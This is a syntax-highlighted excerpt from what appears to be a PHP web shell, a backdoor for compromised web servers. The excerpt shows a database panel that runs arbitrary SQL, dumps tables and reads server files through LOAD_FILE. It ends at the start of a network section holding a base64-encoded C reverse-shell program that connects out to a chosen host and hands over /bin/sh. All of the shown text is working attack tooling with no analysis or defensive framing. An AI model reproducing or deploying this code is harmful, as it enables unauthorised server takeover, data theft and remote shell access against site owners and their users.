<span class="lineno">1230</span> <span class="x">                &lt;input type=hidden name=p1 value=&#39;query&#39;&gt; </span>
<span class="lineno">1231</span> <span class="x">                &lt;input type=hidden name=p2&gt; </span>
<span class="lineno">1232</span> <span class="x">                &lt;input type=hidden name=c value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="x">&#39;&gt; </span>
<span class="lineno">1233</span> <span class="x">                &lt;input type=hidden name=charset value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="cp">?&gt;</span><span class="x">&#39;&gt; </span>
<span class="lineno">1234</span> <span class="x">                &lt;td&gt; </span>
<span class="lineno">1235</span> <span class="x">                    &lt;select name=&#39;type&#39;&gt; </span>
<span class="lineno">1236</span> <span class="x">                        &lt;option value=&quot;mysql&quot; </span><span class="cp">&lt;?php</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;mysql&#39;</span><span class="p">)</span><span class="k">echo</span> <span class="s1">&#39;selected&#39;</span><span class="p">;</span><span class="cp">?&gt;</span><span class="x">&gt;MySql&lt;/option&gt; </span>
<span class="lineno">1237</span> <span class="x">                        &lt;option value=&quot;pgsql&quot; </span><span class="cp">&lt;?php</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;pgsql&#39;</span><span class="p">)</span><span class="k">echo</span> <span class="s1">&#39;selected&#39;</span><span class="p">;</span><span class="cp">?&gt;</span><span class="x">&gt;PostgreSql&lt;/option&gt; </span>
<span class="lineno">1238</span> <span class="x">                    &lt;/select&gt;&lt;/td&gt; </span>
<span class="lineno">1239</span> <span class="x">                &lt;td&gt;&lt;input type=text name=sql_host value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;localhost&#39;</span><span class="o">:</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">]));</span><span class="cp">?&gt;</span><span class="x">&#39;&gt;&lt;/td&gt; </span>
<span class="lineno">1240</span> <span class="x">                &lt;td&gt;&lt;input type=text name=sql_login value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_login&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;root&#39;</span><span class="o">:</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_login&#39;</span><span class="p">]));</span><span class="cp">?&gt;</span><span class="x">&#39;&gt;&lt;/td&gt; </span>
<span class="lineno">1241</span> <span class="x">                &lt;td&gt;&lt;input type=text name=sql_pass value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_pass&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;&#39;</span><span class="o">:</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_pass&#39;</span><span class="p">]));</span><span class="cp">?&gt;</span><span class="x">&#39;&gt;&lt;/td&gt; </span>
<span class="lineno">1242</span> <span class="x">                &lt;td&gt; </span>
<span class="lineno">1243</span> <span class="x">    </span><span class="cp">&lt;?php</span> 
<span class="lineno">1244</span>     <span class="nv">$tmp</span> <span class="o">=</span> <span class="s2">&quot;&lt;input type=text name=sql_base value=&#39;&#39;&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">1245</span>     <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">])){</span> 
<span class="lineno">1246</span>         <span class="k">if</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">connect</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_login&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_pass&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">]))</span> <span class="p">{</span> 
<span class="lineno">1247</span>             <span class="k">switch</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span> <span class="p">{</span> 
<span class="lineno">1248</span>                 <span class="k">case</span> <span class="s2">&quot;Windows-1251&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">setCharset</span><span class="p">(</span><span class="s1">&#39;cp1251&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1249</span>                 <span class="k">case</span> <span class="s2">&quot;UTF-8&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">setCharset</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1250</span>                 <span class="k">case</span> <span class="s2">&quot;KOI8-R&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">setCharset</span><span class="p">(</span><span class="s1">&#39;koi8r&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1251</span>                 <span class="k">case</span> <span class="s2">&quot;KOI8-U&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">setCharset</span><span class="p">(</span><span class="s1">&#39;koi8u&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1252</span>                 <span class="k">case</span> <span class="s2">&quot;cp866&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">setCharset</span><span class="p">(</span><span class="s1">&#39;cp866&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1253</span>             <span class="p">}</span> 
<span class="lineno">1254</span>             <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">listDbs</span><span class="p">();</span> 
<span class="lineno">1255</span>             <span class="k">echo</span> <span class="s2">&quot;&lt;select name=sql_base&gt;&lt;option value=&#39;&#39;&gt;&lt;/option&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">1256</span>             <span class="k">while</span><span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">())</span> <span class="p">{</span> 
<span class="lineno">1257</span>                 <span class="k">list</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$value</span><span class="p">)</span> <span class="o">=</span> <span class="nb">each</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span> 
<span class="lineno">1258</span>                 <span class="k">echo</span> <span class="s1">&#39;&lt;option value=&quot;&#39;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s1">&#39;&quot; &#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$value</span><span class="o">==</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">]</span><span class="o">?</span><span class="s1">&#39;selected&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&gt;&#39;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s1">&#39;&lt;/option&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1259</span>             <span class="p">}</span> 
<span class="lineno">1260</span>             <span class="k">echo</span> <span class="s1">&#39;&lt;/select&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1261</span>         <span class="p">}</span> 
<span class="lineno">1262</span>         <span class="k">else</span> <span class="k">echo</span> <span class="nv">$tmp</span><span class="p">;</span> 
<span class="lineno">1263</span>     <span class="p">}</span><span class="k">else</span> 
<span class="lineno">1264</span>         <span class="k">echo</span> <span class="nv">$tmp</span><span class="p">;</span> 
<span class="lineno">1265</span>     <span class="cp">?&gt;</span><span class="x">&lt;/td&gt; </span>
<span class="lineno">1266</span> <span class="x">                &lt;td&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/td&gt; </span>
<span class="lineno">1267</span> <span class="x">            &lt;/tr&gt; </span>
<span class="lineno">1268</span> <span class="x">        &lt;/table&gt; </span>
<span class="lineno">1269</span> <span class="x">        &lt;script&gt; </span>
<span class="lineno">1270</span> <span class="x">            function st(t,l) { </span>
<span class="lineno">1271</span> <span class="x">                document.sf.p1.value = &#39;select&#39;; </span>
<span class="lineno">1272</span> <span class="x">                document.sf.p2.value = t; </span>
<span class="lineno">1273</span> <span class="x">                if(l!=null)document.sf.p3.value = l; </span>
<span class="lineno">1274</span> <span class="x">                document.sf.submit(); </span>
<span class="lineno">1275</span> <span class="x">            } </span>
<span class="lineno">1276</span> <span class="x">            function is() { </span>
<span class="lineno">1277</span> <span class="x">                for(i=0;i&lt;document.sf.elements[&#39;tbl[]&#39;].length;++i) </span>
<span class="lineno">1278</span> <span class="x">                    document.sf.elements[&#39;tbl[]&#39;][i].checked = !document.sf.elements[&#39;tbl[]&#39;][i].checked; </span>
<span class="lineno">1279</span> <span class="x">            } </span>
<span class="lineno">1280</span> <span class="x">        &lt;/script&gt; </span>
<span class="lineno">1281</span> <span class="x">    </span><span class="cp">&lt;?php</span> 
<span class="lineno">1282</span>     <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$db</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">link</span><span class="p">){</span> 
<span class="lineno">1283</span>         <span class="k">echo</span> <span class="s2">&quot;&lt;br/&gt;&lt;table width=100% cellpadding=2 cellspacing=0&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">1284</span>             <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">])){</span> 
<span class="lineno">1285</span>                 <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">selectdb</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">]);</span> 
<span class="lineno">1286</span>                 <span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&lt;td width=1 style=&#39;border-top:2px solid #666;border-right:2px solid #666;&#39;&gt;&lt;span&gt;Tables:&lt;/span&gt;&lt;br&gt;&lt;br&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">1287</span>                 <span class="nv">$tbls_res</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">listTables</span><span class="p">();</span> 
<span class="lineno">1288</span>                 <span class="k">while</span><span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">(</span><span class="nv">$tbls_res</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno">1289</span>                     <span class="k">list</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$value</span><span class="p">)</span> <span class="o">=</span> <span class="nb">each</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span> 
<span class="lineno">1290</span>                     <span class="nv">$n</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;SELECT COUNT(*) as n FROM &#39;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s1">&#39;&#39;</span><span class="p">));</span> 
<span class="lineno">1291</span>                     <span class="nv">$value</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span> 
<span class="lineno">1292</span>                     <span class="k">echo</span> <span class="s2">&quot;&lt;nobr&gt;&lt;input type=&#39;checkbox&#39; name=&#39;tbl[]&#39; value=&#39;&quot;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s2">&quot;&#39;&gt;&amp;nbsp;&lt;a href=# onclick=</span><span class="se">\&quot;</span><span class="s2">st(&#39;&quot;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s2">&quot;&#39;)</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s2">&quot;&lt;/a&gt; (&quot;</span><span class="o">.</span><span class="nv">$n</span><span class="p">[</span><span class="s1">&#39;n&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;)&lt;/nobr&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1293</span>                 <span class="p">}</span> 
<span class="lineno">1294</span>                 <span class="k">echo</span> <span class="s2">&quot;&lt;input type=&#39;checkbox&#39; onclick=&#39;is();&#39;&gt; &lt;input type=button value=&#39;Dump&#39; onclick=&#39;document.sf.p2.value=</span><span class="se">\&quot;</span><span class="s2">download</span><span class="se">\&quot;</span><span class="s2">;document.sf.submit();&#39;&gt;&lt;/td&gt;&lt;td style=&#39;border-top:2px solid #666;&#39;&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">1295</span>                 <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;select&#39;</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1296</span>                     <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;query&#39;</span><span class="p">;</span> 
<span class="lineno">1297</span>                     <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;SELECT COUNT(*) as n FROM &#39;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&#39;</span><span class="p">);</span> 
<span class="lineno">1298</span>                     <span class="nv">$num</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">();</span> 
<span class="lineno">1299</span>                     <span class="nv">$num</span> <span class="o">=</span> <span class="nv">$num</span><span class="p">[</span><span class="s1">&#39;n&#39;</span><span class="p">];</span> 
<span class="lineno">1300</span>                     <span class="k">echo</span> <span class="s2">&quot;&lt;span&gt;&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/span&gt; (</span><span class="si">$num</span><span class="s2">) &quot;</span><span class="p">;</span> 
<span class="lineno">1301</span>                     <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="p">(</span><span class="nv">$num</span><span class="o">/</span><span class="mi">30</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> 
<span class="lineno">1302</span>                         <span class="k">if</span><span class="p">(</span><span class="nv">$i</span> <span class="o">!=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span> 
<span class="lineno">1303</span>                             <span class="k">echo</span> <span class="s2">&quot;&lt;a href=&#39;#&#39; onclick=&#39;st(</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">, </span><span class="si">$i</span><span class="s2">)&#39;&gt;&quot;</span><span class="p">,(</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span><span class="p">),</span><span class="s2">&quot;&lt;/a&gt; &quot;</span><span class="p">;</span> 
<span class="lineno">1304</span>                         <span class="k">else</span> 
<span class="lineno">1305</span>                             <span class="k">echo</span> <span class="p">(</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span><span class="p">),</span><span class="s2">&quot; &quot;</span><span class="p">;</span> 
<span class="lineno">1306</span>                     <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;pgsql&#39;</span><span class="p">)</span> 
<span class="lineno">1307</span>                         <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;SELECT * FROM &#39;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39; LIMIT 30 OFFSET &#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">*</span><span class="mi">30</span><span class="p">);</span> 
<span class="lineno">1308</span>                     <span class="k">else</span> 
<span class="lineno">1309</span>                         <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;SELECT * FROM `&#39;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;` LIMIT &#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">*</span><span class="mi">30</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;,30&#39;</span><span class="p">;</span> 
<span class="lineno">1310</span>                     <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;&lt;br&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">1311</span>                 <span class="p">}</span> 
<span class="lineno">1312</span>                 <span class="k">if</span><span class="p">((</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;query&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]))</span> <span class="p">{</span> 
<span class="lineno">1313</span>                     <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]);</span> 
<span class="lineno">1314</span>                     <span class="k">if</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">res</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1315</span>                         <span class="nv">$title</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span> 
<span class="lineno">1316</span>                         <span class="k">echo</span> <span class="s1">&#39;&lt;table width=100% cellspacing=0 cellpadding=2 class=main&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1317</span>                         <span class="nv">$line</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> 
<span class="lineno">1318</span>                         <span class="k">while</span><span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">())</span>    <span class="p">{</span> 
<span class="lineno">1319</span>                             <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$title</span><span class="p">)</span>    <span class="p">{</span> 
<span class="lineno">1320</span>                                 <span class="k">echo</span> <span class="s1">&#39;&lt;tr&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1321</span>                                 <span class="k">foreach</span><span class="p">(</span><span class="nv">$item</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> 
<span class="lineno">1322</span>                                     <span class="k">echo</span> <span class="s1">&#39;&lt;th&gt;&#39;</span><span class="o">.</span><span class="nv">$key</span><span class="o">.</span><span class="s1">&#39;&lt;/th&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1323</span>                                 <span class="nb">reset</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span> 
<span class="lineno">1324</span>                                 <span class="nv">$title</span><span class="o">=</span><span class="k">true</span><span class="p">;</span> 
<span class="lineno">1325</span>                                 <span class="k">echo</span> <span class="s1">&#39;&lt;/tr&gt;&lt;tr&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1326</span>                                 <span class="nv">$line</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span> 
<span class="lineno">1327</span>                             <span class="p">}</span> 
<span class="lineno">1328</span>                             <span class="k">echo</span> <span class="s1">&#39;&lt;tr class=&quot;l&#39;</span><span class="o">.</span><span class="nv">$line</span><span class="o">.</span><span class="s1">&#39;&quot;&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1329</span>                             <span class="nv">$line</span> <span class="o">=</span> <span class="nv">$line</span><span class="o">==</span><span class="mi">1</span><span class="o">?</span><span class="mi">2</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span> 
<span class="lineno">1330</span>                             <span class="k">foreach</span><span class="p">(</span><span class="nv">$item</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1331</span>                                 <span class="k">if</span><span class="p">(</span><span class="nv">$value</span> <span class="o">==</span> <span class="k">null</span><span class="p">)</span> 
<span class="lineno">1332</span>                                     <span class="k">echo</span> <span class="s1">&#39;&lt;td&gt;&lt;i&gt;null&lt;/i&gt;&lt;/td&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1333</span>                                 <span class="k">else</span> 
<span class="lineno">1334</span>                                     <span class="k">echo</span> <span class="s1">&#39;&lt;td&gt;&#39;</span><span class="o">.</span><span class="nb">nl2br</span><span class="p">(</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$value</span><span class="p">))</span><span class="o">.</span><span class="s1">&#39;&lt;/td&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1335</span>                             <span class="p">}</span> 
<span class="lineno">1336</span>                             <span class="k">echo</span> <span class="s1">&#39;&lt;/tr&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1337</span>                         <span class="p">}</span> 
<span class="lineno">1338</span>                         <span class="k">echo</span> <span class="s1">&#39;&lt;/table&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1339</span>                     <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> 
<span class="lineno">1340</span>                         <span class="k">echo</span> <span class="s1">&#39;&lt;div&gt;&lt;b&gt;Error:&lt;/b&gt; &#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">())</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1341</span>                     <span class="p">}</span> 
<span class="lineno">1342</span>                 <span class="p">}</span> 
<span class="lineno">1343</span>                 <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;&lt;textarea name=&#39;p3&#39; style=&#39;width:100%;height:100px&#39;&gt;&quot;</span><span class="o">.@</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&lt;/textarea&gt;&lt;br/&gt;&lt;input type=submit value=&#39;Execute&#39;&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">1344</span>                 <span class="k">echo</span> <span class="s2">&quot;&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">1345</span>             <span class="p">}</span> 
<span class="lineno">1346</span>             <span class="k">echo</span> <span class="s2">&quot;&lt;/table&gt;&lt;/form&gt;&lt;br/&gt;&lt;form onsubmit=&#39;document.sf.p1.value=</span><span class="se">\&quot;</span><span class="s2">loadfile</span><span class="se">\&quot;</span><span class="s2">;document.sf.p2.value=this.f.value;document.sf.submit();return false;&#39;&gt;&lt;span&gt;Load file&lt;/span&gt; &lt;input  class=&#39;toolsInp&#39; type=text name=f&gt;&lt;input type=submit value=&#39;&gt;&gt;&#39;&gt;&lt;/form&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">1347</span>             <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;loadfile&#39;</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1348</span>                 <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;SELECT LOAD_FILE(&#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&#39;) as file&quot;</span><span class="p">);</span> 
<span class="lineno">1349</span>                 <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">();</span> 
<span class="lineno">1350</span>                 <span class="k">echo</span> <span class="s1">&#39;&lt;pre class=ml1&gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&lt;/pre&gt;&#39;</span><span class="p">;</span>
<span class="lineno">1351</span>             <span class="p">}</span> 
<span class="lineno">1352</span>     <span class="p">}</span> 
<span class="lineno">1353</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1354</span>     <span class="nx">printFooter</span><span class="p">();</span> 
<span class="lineno">1355</span> <span class="p">}</span> 
<span class="lineno">1356</span> <span class="k">function</span> <span class="nf">actionNetwork</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno">1357</span>     <span class="nx">printHeader</span><span class="p">();</span> 
<span class="lineno">1358</span>     <span class="nv">$back_connect_c</span><span class="o">=</span><span class="s2">&quot;I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsNCiAgICBpbnQgZmQ7DQogICAgc3RydWN0IHNvY2thZGRyX2luIHNpbjsNCiAgICBkYWVtb24oMSwwKTsNCiAgICBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogICAgc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsNCiAgICBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsNCiAgICBpZiAoKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNpbiwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcikpKTwwKSB7DQogICAgICAgIHBlcnJvcigiQ29ubmVjdCBmYWlsIik7DQogICAgICAgIHJldHVybiAwOw0KICAgIH0NCiAgICBkdXAyKGZkLCAwKTsNCiAgICBkdXAyKGZkLCAxKTsNCiAgICBkdXAyKGZkLCAyKTsNCiAgICBzeXN0ZW0oIi9iaW4vc2ggLWkiKTsNCiAgICBjbG9zZShmZCk7DQp9&quot;</span><span class="p">;</span> 
